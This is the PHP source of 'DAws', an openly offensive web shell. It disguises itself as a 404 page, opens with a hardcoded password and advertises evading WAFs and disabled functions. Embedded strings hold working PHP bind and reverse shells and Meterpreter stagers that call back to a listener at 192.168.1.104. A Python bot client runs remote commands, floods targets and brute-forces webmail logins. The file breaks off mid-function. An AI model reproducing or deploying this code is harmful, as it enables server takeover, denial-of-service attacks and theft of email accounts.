<?php
#DAws
#Credits:
#	dotcppfile & Aces

error_reporting(E_ALL);
ini_set('display_errors', '1');

session_start();
ob_start();

$notfound = "
<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
<hr>
<address>at ".$_SERVER['SERVER_ADDR']." Port 80</address>
</body></html>";

if(isset($_POST['pass']))
{
	if($_POST['pass'] == "DAws")
	{
		$_SESSION['login']=true;
	}
	else
	{
		session_destroy();
		echo "$notfound";
		exit;
	}
}
else if(isset($_SESSION['login']))
{
	if ($_SESSION['login'] != true)
	{
		session_destroy();
		echo "$notfound";
		exit;
	}
}
else
{
	session_destroy();
	echo "$notfound";
	exit;
}

if (isset($_GET["logout"]))
{
	if ($_GET["logout"] == "true")
	{
		session_destroy();
		header("Location: ".$_SERVER['PHP_SELF']);
	}
}
?>

<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<meta http-equiv='content-type' content='text/html; charset=utf-8'/>
<title>DAws</title>
<style type="text/css">
	html {
		overflow-y: scroll; 
	}
	body {
		font-family: Arial, sans-serif; 
		line-height: 1.4;
		font-size: 15px;
		background: #242625;
		color: #F9F7ED;
		margin: 0;
		padding: 0;
		font-size: 85%;
	}
	form {
		display: inline-block;
	}
	textarea {
		width: 750px;
		height: 250px
	}
	a { 
		color: #B3E1EF; 
		text-decoration: none;
	}
	a:hover { 
		text-decoration: underline; 
	}
	h1 {
		margin: 0;
		font-weight: 100;
	}
	h1 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h1 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h2 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h2 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h3 {
		margin-top: 10px;
		margin-bottom: 10px;
	}
	.flat-table {
		margin-bottom: 20px;
		border-collapse:collapse;
		font-family: 'Lato', Calibri, Arial, sans-serif;
		border: 1px solid black;
		border-radius: 3px;
		-webkit-border-radius: 3px;
		-moz-bordesr-radius: 3px;
	}
	.flat-table tr {
		-webkit-transition: background 0.3s, box-shadow 0.3s;
		-moz-transition: background 0.3s, box-shadow 0.3s;
		transition: background 0.3s, box-shadow 0.3s;
	}
	.flat-table th {
		background: #2C2F2D;
		height: 30px;
		line-height: 30px;
		font-weight: 600;
		font-size: 13px;
		margin: 0 0 0 0; 
		padding: 0 0 0 10px; 
		color: #F9F7ED;
		border: 1px solid black;
	}
	.flat-table td {
		height: 30px;
		overflow:hidden;
		border: 1px solid black;
	}
	.flat-table th, .flat-table td {
		box-shadow: inset 0 -1px rgba(0,0,0,0.25), inset 0 1px rgba(0,0,0,0.25);
	}
	.flat-table-1 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 1020px;
	}
	.flat-table-2 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 505px;
		height: 335px;
	}
	.flat-table-3 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 750px;
		height: 100px;
	}
	.flat-table-1 tr:hover, .flat-table-2 tr:hover, .flat-table-3 tr:hover{
		background: rgba(0,0,0,0.19);
	}
	.danger {
		color: red;
	}
	.success {
		color: green;
	}
	.tabs {
		position: fixed;
		top: 0;
	}
	.fButton {
		position: fixed;
		top: 0;
		right: 0;
	}
</style>

<script>
function base64encode(form, command) 
{
	if (command.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.command.value = btoa(command.value);
	form.submit();
	return true;
}

function base64encode2(form, language, command) 
{
	if (command.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.eval.value = btoa(command.value);
	form.submit();
	return true;
}

function base64encode3(form, original_name, new_name) 
{
	if ((original_name.value == '') || (new_name.value == ''))
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.original_name.value = btoa(original_name.value);	
	form.new_name.value = btoa(new_name.value);	
	form.submit();
	return true;
}

function base64encode4(form, dir) 
{
	if (dir.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.dir.value = btoa(dir.value);	
	form.submit();
	return true;
}

function base64encode5(form, content) 
{
	if (content.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.content.value = btoa(content.value);	
	form.submit();
	return true;
}

function showDiv()
{
	if (document.getElementById("features").style.display == "block") 
	{
    		document.getElementById("features").style.display = "none";
   	} 
	else 
	{
    		document.getElementById("features").style.display = "block";
	}
}
</script>
</head>

<body>
<div id="features" style='display:none'>>
<ul>
	<il><font color=#B3E1EF size=5>About</font></il>
	<ul>
		<li>There's multiple things that makes DAws better than every Web Shell out there:</li>
		<ol>
			<li>Bypasses Disablers; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if `shell_exec` was disabled it would automatically use `exec` or `passthru` or `system` or `popen` or `proc_open` instead, same for Downloading a File from a Link, if `Curl` was disabled then `file_get_content` is used instead and this Feature is widely used in every section and fucntion of the shell.</li>
			<li>Automatic Base64 Encoding; DAws base64 encodes automatically most of your GET and POST data using Java Script or PHP which will allow your shell to Bypass pretty much every WAF out there.</li>
			<li>Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li>
			<li>Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li>
			<li>Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li>
			<li>Supports Windows and Linux.</li>
			<li>Openned Source.</li>
		</ol>
		DAws was mainly created by dotcppfile and Aces because everyone was getting sick of all these Shells that were easily stopped by WAFs or Disablers or whatever. Something like DAws is really hard to stop because there's always a substitute for everything and the user doens't have to worry about it at all.
	</ul>
	
	<br><il><font color=#B3E1EF size=5>Extra Info</font></il>
	<ul>
		<li>Download from Link - Methods:</li>
		<ul>
			<li>PHP Curl</li>
			<li>File_put_content</li>
		</ul>
		<li>Zip - Methods:</li>
		<ul>
			<li>Linux:</li>	
			<ol>
				<li>Zip</li>
			</ol>
			<li>Windows:</li>
			<ol>
				<li>Vbs Script</li>
			</ol>
		</ul>
		<li>Shells and Tools:</li>
		<ul>
			<li>Extra:</li>
			<ol>
				<li>`nohup`, if installed, is automatically used for background processing.</li>
			</ol>
		</ul>
	</ul>
</ul>
</div>

<center>

<?php
	echo "<br><br><h1><a href=".$_SERVER['PHP_SELF'].">DAws</a></h1>";

$phpbindshell = "
<?php
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      \$XHuyxs=@ini_get('disable_functions');
      if(!empty(\$XHuyxs)){
        \$XHuyxs=preg_replace('/[, ]+/', ',', \$XHuyxs);
        \$XHuyxs=explode(',', \$XHuyxs);
        \$XHuyxs=array_map('trim', \$XHuyxs);
      }else{
        \$XHuyxs=array();
      }
      
    \$port=4444;

    \$scl='socket_create_listen';
    if(is_callable(\$scl)&&!in_array(\$scl,\$XHuyxs)){
      \$sock=@\$scl(\$port);
    }else{
      \$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      \$ret=@socket_bind(\$sock,0,\$port);
      \$ret=@socket_listen(\$sock,5);
    }
    \$msgsock=@socket_accept(\$sock);
    @socket_close(\$sock);

    while(FALSE!==@socket_select(\$r=array(\$msgsock), \$w=NULL, \$e=NULL, NULL))
    {
      \$o = '';
      \$c=@socket_read(\$msgsock,2048,PHP_NORMAL_READ);
      if(FALSE===\$c){break;}
      if(substr(\$c,0,3) == 'cd '){
        chdir(substr(\$c,3,-1));
      } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
        break;
      }else{
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        \$c=\$c.\" 2>&1\n\";
      }
      \$HyNRmM='is_callable';
      \$DjrtH='in_array';
      
      if(\$HyNRmM('exec')and!\$DjrtH('exec',\$XHuyxs)){
        \$o=array();
        exec(\$c,\$o);
        \$o=join(chr(10),\$o).chr(10);
      }else
      if(\$HyNRmM('proc_open')and!\$DjrtH('proc_open',\$XHuyxs)){
        \$handle=proc_open(\$c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),\$pipes);
        \$o=NULL;
        while(!feof(\$pipes[1])){
          \$o.=fread(\$pipes[1],1024);
        }
        @proc_close(\$handle);
      }else
      if(\$HyNRmM('system')and!\$DjrtH('system',\$XHuyxs)){
        ob_start();
        system(\$c);
        \$o=ob_get_contents();
        ob_end_clean();
      }else
      if(\$HyNRmM('popen')and!\$DjrtH('popen',\$XHuyxs)){
        \$fp=popen(\$c,'r');
        \$o=NULL;
        if(is_resource(\$fp)){
          while(!feof(\$fp)){
            \$o.=fread(\$fp,1024);
          }
        }
        @pclose(\$fp);
      }else
      if(\$HyNRmM('passthru')and!\$DjrtH('passthru',\$XHuyxs)){
        ob_start();
        passthru(\$c);
        \$o=ob_get_contents();
        ob_end_clean();
      }else
      if(\$HyNRmM('shell_exec')and!\$DjrtH('shell_exec',\$XHuyxs)){
        \$o=shell_exec(\$c);
      }else
      {
        \$o=0;
      }
    
      }
      @socket_write(\$msgsock,\$o,strlen(\$o));
    }
    @socket_close(\$msgsock);
?>";

$phpreverseshell = "
<?php
    \$ipaddr='192.168.1.104';
    \$port=4444;
    
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      \$dis=@ini_get('disable_functions');
      if(!empty(\$dis)){
        \$dis=preg_replace('/[, ]+/', ',', \$dis);
        \$dis=explode(',', \$dis);
        \$dis=array_map('trim', \$dis);
      }else{
        \$dis=array();
      }
      

    if(!function_exists('kNeoPqePPlBkaD')){
      function kNeoPqePPlBkaD(\$c){
        global \$dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        \$c=\$c.\" 2>&1\n\";
      }
      \$QKDG='is_callable';
      \$xMtdww='in_array';
      
      if(\$QKDG('shell_exec')and!\$xMtdww('shell_exec',\$dis)){
        \$o=shell_exec(\$c);
      }else
      if(\$QKDG('popen')and!\$xMtdww('popen',\$dis)){
        \$fp=popen(\$c,'r');
        \$o=NULL;
        if(is_resource(\$fp)){
          while(!feof(\$fp)){
            \$o.=fread(\$fp,1024);
          }
        }
        @pclose(\$fp);
      }else
      if(\$QKDG('passthru')and!\$xMtdww('passthru',\$dis)){
        ob_start();
        passthru(\$c);
        \$o=ob_get_contents();
        ob_end_clean();
      }else
      if(\$QKDG('proc_open')and!\$xMtdww('proc_open',\$dis)){
        \$handle=proc_open(\$c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),\$pipes);
        \$o=NULL;
        while(!feof(\$pipes[1])){
          \$o.=fread(\$pipes[1],1024);
        }
        @proc_close(\$handle);
      }else
      if(\$QKDG('system')and!\$xMtdww('system',\$dis)){
        ob_start();
        system(\$c);
        \$o=ob_get_contents();
        ob_end_clean();
      }else
      if(\$QKDG('exec')and!\$xMtdww('exec',\$dis)){
        \$o=array();
        exec(\$c,\$o);
        \$o=join(chr(10),\$o).chr(10);
      }else
      {
        \$o=0;
      }
    
        return \$o;
      }
    }
    \$nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',\$dis)){
      \$s=@fsockopen(\"tcp://\".\$ipaddr,\$port);
      while(\$c=fread(\$s,2048)){
        \$out = '';
        if(substr(\$c,0,3) == 'cd '){
          chdir(substr(\$c,3,-1));
        } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
          break;
        }else{
          \$out=kNeoPqePPlBkaD(substr(\$c,0,-1));
          if(\$out===false){
            fwrite(\$s,\$nofuncs);
            break;
          }
        }
        fwrite(\$s,\$out);
      }
      fclose(\$s);
    }else{
      \$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect(\$s,\$ipaddr,\$port);
      @socket_write(\$s,\"socket_create\");
      while(\$c=@socket_read(\$s,2048)){
        \$out = '';
        if(substr(\$c,0,3) == 'cd '){
          chdir(substr(\$c,3,-1));
        } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
          break;
        }else{
          \$out=kNeoPqePPlBkaD(substr(\$c,0,-1));
          if(\$out===false){
            @socket_write(\$s,\$nofuncs);
            break;
          }
        }
        @socket_write(\$s,\$out,strlen(\$out));
      }
      @socket_close(\$s);
    }
?>
";

$meterpreterbindshell = "
<?php

# The payload handler overwrites this with the correct LPORT before sending
# it to the victim.
\$port = 4444;
\$ipaddr = \"0.0.0.0\";

if (is_callable('stream_socket_server')) {
	\$srvsock = stream_socket_server(\"tcp://{\$ipaddr}:{\$port}\");
	if (!\$srvsock) { die(); }
	\$s = stream_socket_accept(\$srvsock, -1);
	fclose(\$srvsock);
	\$s_type = 'stream';
} elseif (is_callable('socket_create_listen')) {
	\$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
	if (!\$res) { die(); }
	\$s = socket_accept(\$srvsock);
	socket_close(\$srvsock);
	\$s_type = 'socket';
} elseif (is_callable('socket_create')) {
	\$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	\$res = socket_bind(\$srvsock, \$ipaddr, \$port);
	if (!\$res) { die(); }
	\$s = socket_accept(\$srvsock);
	socket_close(\$srvsock);
	\$s_type = 'socket';
} else {
	die();
}
if (!\$s) { die(); }

switch (\$s_type) {
case 'stream': \$len = fread(\$s, 4); break;
case 'socket': \$len = socket_read(\$s, 4); break;
}
if (!\$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
\$a = unpack(\"Nlen\", \$len);
\$len = \$a['len'];

\$b = '';
while (strlen(\$b) < \$len) {
	switch (\$s_type) {
	case 'stream': \$b .= fread(\$s, \$len-strlen(\$b)); break;
	case 'socket': \$b .= socket_read(\$s, \$len-strlen(\$b)); break;
	}
}

# Set up the socket for the main stage to use.
\$GLOBALS['msgsock'] = \$s;
\$GLOBALS['msgsock_type'] = \$s_type;
eval(\$b);
die();
?>
";

$meterpreterreverseshell = "
#<?php

error_reporting(0);
# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
\$ip = '192.168.1.104';
\$port = 4444;
\$ipf = AF_INET;

if (FALSE !== strpos(\$ip, \":\")) {
	# ipv6 requires brackets around the address
	\$ip = \"[\". \$ip .\"]\";
	\$ipf = AF_INET6;
}

if ((\$f = 'stream_socket_client') && is_callable(\$f)) {
	\$s = \$f(\"tcp://{\$ip}:{\$port}\");
	\$s_type = 'stream';
} elseif ((\$f = 'fsockopen') && is_callable(\$f)) {
	\$s = \$f(\$ip, \$port);
	\$s_type = 'stream';
} elseif ((\$f = 'socket_create') && is_callable(\$f)) {
	\$s = \$f(\$ipf, SOCK_STREAM, SOL_TCP);
	\$res = @socket_connect(\$s, \$ip, \$port);
	if (!\$res) { die(); }
	\$s_type = 'socket';
} else {
	die('no socket funcs');
}
if (!\$s) { die('no socket'); }

switch (\$s_type) { 
case 'stream': \$len = fread(\$s, 4); break;
case 'socket': \$len = socket_read(\$s, 4); break;
}
if (!\$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
\$a = unpack(\"Nlen\", \$len);
\$len = \$a['len'];

\$b = '';
while (strlen(\$b) < \$len) {
	switch (\$s_type) { 
	case 'stream': \$b .= fread(\$s, \$len-strlen(\$b)); break;
	case 'socket': \$b .= socket_read(\$s, \$len-strlen(\$b)); break;
	}
}

# Set up the socket for the main stage to use.
\$GLOBALS['msgsock'] = \$s;
\$GLOBALS['msgsock_type'] = \$s_type;
eval(\$b);
die();
?>
";

$serbotclient = "
#!/usr/bin/env python2

import subprocess, os, sys, time, threading, signal, smtplib
from socket import *
from itertools import product
from threading import Thread

host = \"192.168.1.4\"
port = 4444

class Alarm(Exception):
    pass

def alarm_handler(signum, frame):
    raise Alarm

def savePass(password):
	f = open(\"password.txt\", \"w\")
	f.write(password)
	f.close()

def gmailbruteforce(email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP(\"smtp.gmail.com\",587)
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False;

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
				except(smtplib.SMTPAuthenticationError), msg:
					if \"Please Log\" in str(msg):
						savePass(password)
						found = True
						break
		else:
			break

def custombruteforce(address, port, email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP(address,int(port))
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False;

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
					savePass(password)
					found = True
					break
				except:
					pass
		else:
			break

class udpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_DGRAM)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)        
		else:
			break

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(1)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)       
		else:
			break

def udpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 11):
    		thread = udpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def tcpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 11):
    		thread = tcpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def main():
	while 1:
		s=socket(AF_INET, SOCK_STREAM)
		while 1:
			try:
				s.connect((host,port))
				print \"[INFO] Connected\"
				break
			except:
				time.sleep(5)
		
		while 1:
			try:
				msg=s.recv(10240)
				if ((msg != \"exit\") and (\"cd \" not in msg) and (\"udpflood \" not in msg) and (\"tcpflood \" not in msg) and (msg != \"hellows123\") and (\"udpfloodall \" not in msg) and (\"tcpfloodall \" not in msg) and (\"gmailbruteforce\" not in msg) and (\"livebruteforce\" not in msg) and (\"yahoobruteforce\" not in msg) and (\"aolbruteforce\" not in msg) and (\"custombruteforce\" not in msg)):
					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					signal.signal(signal.SIGALRM, alarm_handler)
					signal.alarm(30)
					try:
    						STDOUT, STDERR = comm.communicate()
						en_STDERR = bytearray(STDERR)
						en_STDOUT = bytearray(STDOUT)
						if (en_STDERR == \"\"):
							if (en_STDOUT != \"\"):
								print en_STDOUT
								s.send(en_STDOUT)
							else:
								s.send(\"[CLIENT] Command Executed\")
						else:
							print en_STDERR
							s.send(en_STDERR)
					except Alarm:
						comm.terminate()
						comm.kill()
    						s.send(\"[CLIENT] 30 Seconds Exceeded - SubProcess Killed\\n\")				
					signal.alarm(0)
				elif (\"cd \" in msg):
					msg = msg.replace(\"cd \",\"\")
					os.chdir(msg)
					s.send(os.getcwd())
					print \"[INFO] Changed dir to %s\" % os.getcwd()
				elif (\"udpflood \" in msg):
					msg = msg.replace(\"udpflood \", \"\")
					seperator = msg.index(\":\")
					try:
						udpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif (\"udpfloodall \" in msg):
					msg = msg.replace(\"udpfloodall \", \"\")
					seperator = msg.index(\":\")
					try:
						udpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif (\"tcpflood \" in msg):
					msg = msg.replace(\"tcpflood \", \"\")
					seperator = msg.index(\":\")
					try:
						tcpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif (\"tcpfloodall \" in msg):
					msg = msg.replace(\"tcpfloodall \", \"\")
					seperator = msg.index(\":\")
					try:
						tcpUnleach(msg[:seperator],msg[seperator+1:])
					except:
						pass
				elif (\"gmailbruteforce \" in msg):
					msg = msg.replace(\"gmailbruteforce \", \"\")
					try:
						email, combination, minimum, maximum = msg.split(\":\")
						t = Thread(None,gmailbruteforce,None,(email, combination, minimum, maximum))
        					t.start()
						s.send(\"[INFO] Bruteforcing started\\n\")				
					except:
						s.send(\"[ERROR] Wrong arguments\\n\")
				elif (\"livebruteforce \" in msg):
					msg = msg.replace(\"livebruteforce \", \"\")
					try:
						email, combination, minimum, maximum = msg.split(\":\")
						t = Thread(None,custombruteforce,None,(\"smtp.live.com\", 587, email, combination, minimum, maximum))
        					t.start()
						s.send(\"[INFO] Bruteforcing started\\n\")				
					except:
						s.send(\"[ERROR] Wrong arguments\\n\")
				elif (\"yahoobruteforce \" in msg):
					msg = msg.replace(\"yahoobruteforce \", \"\")
					try:
						email, combination, minimum, maximum = msg.split(\":\")
						t = Thread(None,custombruteforce,None,(\"smtp.mail.yahoo.com\", 587, email, combination, minimum, maximum))
        					t.start()
						s.send(\"[INFO] Bruteforcing started\\n\")				
					except:
						s.send(\"[ERROR] Wrong arguments\\n\")
				elif (\"aolbruteforce \" in msg):
					msg = msg.replace(\"aolbruteforce \", \"\")
					try:
						email, combination, minimum, maximum = msg.split(\":\")
						t = Thread(None,custombruteforce,None,(\"smtp.aol.com\", 587, email, combination, minimum, maximum))
        					t.start()
						s.send(\"[INFO] Bruteforcing started\\n\")				
					except:
						s.send(\"[ERROR] Wrong arguments\\n\")
				elif (\"custombruteforce \" in msg):
					msg = msg.replace(\"custombruteforce \", \"\")
					try:
						address, port, email, combination, minimum, maximum = msg.split(\":\")
						t = Thread(None,custombruteforce,None,(address, port, email, combination, minimum, maximum))
        					t.start()
						s.send(\"[INFO] Bruteforcing started\\n\")				
					except:
						s.send(\"[ERROR] Wrong arguments\\n\")
				elif (msg == \"hellows123\"):
					s.send(os.getcwd())
				else:
					print \"[INFO] Connection Closed\"
					s.close()
					break
			except KeyboardInterrupt:
				print \"[INFO] Connection Closed\"
				s.close()
				break
			except:
				print \"[INFO] Connection Closed\"
				s.close()
				break
			
while 1:
	try:
		main()
	except:
		pass

	time.sleep(5)

";

$bpscan = "
#!/usr/bin/env python2

import urllib2, urllib, sys, threading
from socket import *

print \"\"\"
 _                               
| |__  _ __  ___  ___ __ _ _ __  
| '_ \| '_ \/ __|/ __/ _` | '_ \ 
| |_) | |_) \__ \ (_| (_| | | | |
|_.__/| .__/|___/\___\__,_|_| |_|
      |_|                        

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com
\"\"\"

def logPorts(port):
	f = open(\"bpscan - ports.txt\", \"a\")
	port = \"%d\\n\" % int(port)
	f.write(port)
	f.close()

def logErrors(error):
	f = open(\"bpscan - errors.txt\", \"a\")
	error = \"%s\\n\" % error
	f.write(error)
	f.close()

url = \"http://www.canyouseeme.org/\"
http_header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
}

class mainchecker(threading.Thread):
   	def __init__ (self, port):
        	threading.Thread.__init__(self)
        	self.port = port

    	def run(self):
		print \"Trying: %d\" % int(self.port)

		try:
			s=socket(AF_INET, SOCK_STREAM)
			s.bind((\"0.0.0.0\", int(self.port)))
			s.listen(5)
			params = {
  				'port': int(self.port),
				'IP': '127.0.0.1',
			}

			data = urllib.urlencode(params)
			req = urllib2.Request(url, data, http_header)
			response = urllib2.urlopen(req)
			the_page = response.read()

			if (\"I can see your service on\" in the_page):
				logPorts(int(self.port))

		except Exception as err:
			err = \"Port %d: %s\" % (int(self.port), err)
			logErrors(err)

		s.close()

ports = []
threads = []
for x in range(1024, 65537):
	ports.append(x)
	if (len(ports) == 25):
		for i in ports:
    			thread = mainchecker(i)
    			thread.start()
   			threads.append(thread)
 
		for thread in threads:
    			thread.join()
		
		del threads[:]
		del ports[:]
"
;

?>

Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a> and <a target="_blank" href="https://twitter.com/__A_C_E_S__">Aces</a><br>Greetings to <a target="_blank" href="https://twitter.com/chaoshackerz">ChaosHackerz</a>

<div class="tabs">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Information" ONCLICK="window.location.href='#Information'">
		<INPUT Type="BUTTON" VALUE="File Manager" ONCLICK="window.location.href='#File Manager'">
		<INPUT Type="BUTTON" VALUE="Commander" ONCLICK="window.location.href='#Commander'">
		<INPUT Type="BUTTON" VALUE="Eval" ONCLICK="window.location.href='#Eval'">
		<INPUT Type="BUTTON" VALUE="Process Manager" ONCLICK="window.location.href='#Process Manager'">
		<INPUT Type="BUTTON" VALUE="Shells" ONCLICK="window.location.href='#Shells'">
		<INPUT Type="BUTTON" VALUE="Tools" ONCLICK="window.location.href='#Tools'">
	</FORM>
</div>

<div class="fButton">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Features" ALIGN="middle" ONCLICK="showDiv('features')">
	</FORM>
	
	<form action='?logout=true' method='post'>
		<input type='submit' value='Logout' name='Logout'/>
	</form>
</div>

<br><h3><A NAME='Information' href="#Information">Information</A></h3>

<table>
<tr>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Useful Function</th>
		<th>Status</th>
	</tr>
	<?php
	
	$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "curl_version");
	
	foreach($php_functions as $function)
	{
		echo "
		<tr>
			<td>$function</td>";
		if(function_exists($function))
		{
			${"{$function}"} = True;
			echo "
			<td><font color='green'>ENABLED</font></td>
			</tr>";
		}	
		else
		{
			${"{$function}"} = False;
			echo "
			<td><font color='red'>DISABLED</font></td>
			</tr>";
		}
	}

	echo "
		<tr>
			<td>eval</td>";
	$isevalfunctionavailable = false;
	$evalcheck = "\$isevalfunctionavailable = true;";
	eval($evalcheck);
	if ($isevalfunctionavailable == true)
	{
		$eval = True;
		echo "
			<td><font color='green'>ENABLED</font></td>
			</tr>";
	}
	else
	{
		$eval = False;
		echo "
			<td><font color='red'>DISABLED</font></td>
			</tr>";
	}
	
	echo "
		<tr>
			<td>nohup</td>";
	if (command_exists("nohup") != "")
	{
		$nohup = True;
		echo "
			<td><font color='green'>ENABLED</font></td>";
	}
	else
	{
		$nohup = False;
		echo "
			<td><font color='red'>DISABLED</font></td>";	
	}

	echo "
		</tr>";

	?>
</table>
</td>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Name</th>
		<th>Value</th>
	</tr>

	<?php
	
	echo "
	<tr>
		<td>Version</td><td>".php_uname()."</td>
	</tr>
	
	<tr>
		<td>IP Address</td>
		<td>".$_SERVER['SERVER_ADDR']."</td>
	</tr>

	<tr>
		<td>Current User</td>
		<td>".get_current_user()."</td>
	</tr>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		foreach(range('A','Z') as $letter)
		{
			if(file_exists("$letter:"))
			{
				echo "
				<tr>
					<td>Storage Space $letter: (FREE / TOTAL)</td>";
				$bytes = disk_free_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				$bytes = disk_total_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				echo "
					<td>$free / $total</td>
				</tr>";
			}
		}
	}
	else
	{
		echo"
		<tr>
			<td>Storage Space (FREE / TOTAL)</td>";
		$bytes = disk_free_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		$bytes = disk_total_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		echo "
			<td>$free / $total</td>
		</tr>";
	}
	
	echo "
	<tr>
		<td>CPU</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		if ($shell_exec == True)
		{
			$data = shell_exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			echo "<td>".round(explode("\n", str_replace("\"", "", explode(",", $data)[2]))[0])."% </td>";
		}
		else if($exec == True)
		{
			$data = exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			echo "<td>".round(explode("\n", str_replace("\"", "", explode(",", $data)[2]))[0])."% </td>";
		}
		else if($popen == true)
		{
			$pid = popen('typeperf -sc 1 "\processor(_total)\% processor time"',"r");
